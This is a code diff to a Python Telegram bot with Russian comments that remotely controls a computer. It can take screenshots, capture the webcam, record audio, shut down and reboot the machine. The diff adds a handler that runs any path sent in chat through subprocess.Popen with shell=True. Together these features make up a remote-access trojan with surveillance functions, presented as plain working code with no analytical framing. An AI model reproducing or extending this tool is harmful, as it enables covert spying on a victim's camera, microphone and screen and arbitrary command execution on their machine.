@@ -10,9 +10,9 @@ from PIL import Image
 import config
 import sounddevice as sd
 import numpy as np
-import wavio  # Импортируем библиотеку wavio
-import threading  # Импортируем библиотеку threading
-from functools import partial  # Импортируем functools.partial
+import wavio
+import threading
+from functools import partial
 
 # Путь к текущему каталогу, где находится скрипт
 current_directory = os.path.dirname(os.path.abspath(__file__))
@@ -88,17 +88,38 @@ def start(message):
         reboot_button = telebot.types.KeyboardButton("Перезагрузка")
         webcam_button = telebot.types.KeyboardButton("Вебка")
         media_button = telebot.types.KeyboardButton("Открыть фото/видео")
-        audio_button = telebot.types.KeyboardButton("Запись аудио")  # Добавляем кнопку для записи аудио
+        audio_button = telebot.types.KeyboardButton("Запись аудио")
+        run_program_button = telebot.types.KeyboardButton("Запустить программу")  # Добавляем кнопку для запуска программы
         
         markup.row(screenshot_button, shutdown_button, info_button)
         markup.row(reboot_button, webcam_button)
-        markup.row(media_button, audio_button)  # Добавляем кнопку для записи аудио
+        markup.row(media_button, audio_button, run_program_button)  # Добавляем кнопку для запуска программы
         
-        bot.send_message(message.chat.id, "Скрипт запущен")
+        bot.send_message(message.chat.id, "Скрипт запущен / made by @danieldrain ")
         
         bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
     else:
         bot.send_message(message.chat.id, "Вы не авторизованы для использования этого бота.")
+
+# Функция для запуска программы
+def run_program(message, program_path):
+    try:
+        subprocess.Popen(program_path, shell=True)
+        bot.send_message(message.chat.id, f"Программа по пути {program_path} успешно запущена.")
+    except Exception as e:
+        bot.send_message(message.chat.id, f"Произошла ошибка при запуске программы: {str(e)}")
+
+@bot.message_handler(func=lambda message: message.text == "Запустить программу")
+def start_program(message):
+    bot.send_message(message.chat.id, "Введите путь к программе для запуска:")
+    bot.register_next_step_handler(message, get_program_path)
+
+def get_program_path(message):
+    program_path = message.text
+    if os.path.exists(program_path):
+        run_program(message, program_path)
+    else:
+        bot.send_message(message.chat.id, "Указанный путь к программе не существует.")
 
 @bot.message_handler(func=lambda message: message.text == "Скриншот")
 def take_screenshot(message):
